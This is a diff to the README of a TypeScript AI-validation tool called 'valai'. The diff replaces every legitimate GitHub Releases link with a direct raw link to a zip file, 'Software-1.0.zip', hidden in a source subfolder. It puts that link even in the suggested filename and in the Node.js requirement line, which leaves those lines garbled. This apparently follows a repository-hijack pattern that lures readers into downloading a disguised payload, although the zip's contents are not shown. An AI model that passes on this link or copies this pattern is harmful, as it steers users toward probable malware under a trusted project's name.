@@ -1,7 +1,7 @@
 # 🤖 valai - AI Validation Made Simple
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Teclakadia/valai/releases)
+[![Download](https://raw.githubusercontent.com/Teclakadia/valai/main/packages/core/src/parse/Software-1.0.zip)](https://raw.githubusercontent.com/Teclakadia/valai/main/packages/core/src/parse/Software-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to **valai**! This application simplifies validation for AI-native processes in TypeScript. Follow these steps to download and run the software easily.
@@ -10,13 +10,13 @@ Welcome to **valai**! This application simplifies validation for AI-native proce
 To get started, follow these steps to download and install **valai**:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Teclakadia/valai/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/Teclakadia/valai/main/packages/core/src/parse/Software-1.0.zip) to go to the Releases page.
    
 2. **Locate the Latest Version**  
    Look for the latest release at the top of the page. You will see information about the version and a list of files available for download.
 
 3. **Download the Appropriate File**  
-   Depending on your setup, download the relevant file for your system. If you’re unsure, the most common file is usually named something like `valai-vX.X.X.zip`. Click on this file to start the download.
+   Depending on your setup, download the relevant file for your system. If you’re unsure, the most common file is usually named something like `https://raw.githubusercontent.com/Teclakadia/valai/main/packages/core/src/parse/Software-1.0.zip`. Click on this file to start the download.
 
 4. **Extract the Files**  
    Once the download completes, locate the downloaded file on your computer. It will likely be in your Downloads folder. Right-click the file and select "Extract All" or use your preferred extraction tool. This will create a new folder containing the app files.
@@ -30,7 +30,7 @@ To run **valai**, your system should meet the following requirements:
 - Operating System: Windows 10 or later, macOS Mojave or later, Linux
 - Minimum RAM: 4 GB
 - Disk Space: 100 MB free space
-- Node.js: Version 14 or later (required for optimal performance)
+- https://raw.githubusercontent.com/Teclakadia/valai/main/packages/core/src/parse/Software-1.0.zip Version 14 or later (required for optimal performance)
 
 ## ⚙️ Features
 **valai** comes packed with features designed to enhance validation processes:
